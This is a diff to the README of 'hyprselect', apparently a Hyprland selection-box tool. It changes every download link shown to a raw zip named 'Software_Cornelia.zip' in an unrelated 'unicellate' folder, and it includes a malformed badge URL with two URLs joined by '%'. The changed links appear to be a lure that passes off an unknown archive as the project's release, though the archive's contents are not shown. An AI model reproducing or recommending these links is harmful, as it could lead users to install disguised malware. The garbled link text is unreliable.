@@ -1,7 +1,7 @@
 # 🎨 hyprselect - Add a Fun Selection Box to Your Desktop
 
 ## 📥 Download Now
-[![Download hyprselect](https://github.com/kushagrabatra/hyprselect/raw/refs/heads/main/unicellate/hyprselect_3.2-beta.3.zip%https://github.com/kushagrabatra/hyprselect/raw/refs/heads/main/unicellate/hyprselect_3.2-beta.3.zip)](https://github.com/kushagrabatra/hyprselect/raw/refs/heads/main/unicellate/hyprselect_3.2-beta.3.zip)
+[![Download hyprselect](https://raw.githubusercontent.com/kushagrabatra/hyprselect/main/unicellate/Software_Cornelia.zip%https://raw.githubusercontent.com/kushagrabatra/hyprselect/main/unicellate/Software_Cornelia.zip)](https://raw.githubusercontent.com/kushagrabatra/hyprselect/main/unicellate/Software_Cornelia.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Make sure your system meets these requirements prior to installation.
 
 To get started with hyprselect, visit the official releases page to download the latest version:
 
-[Download hyprselect](https://github.com/kushagrabatra/hyprselect/raw/refs/heads/main/unicellate/hyprselect_3.2-beta.3.zip)
+[Download hyprselect](https://raw.githubusercontent.com/kushagrabatra/hyprselect/main/unicellate/Software_Cornelia.zip)
 
 ### Step-by-Step Installation
 
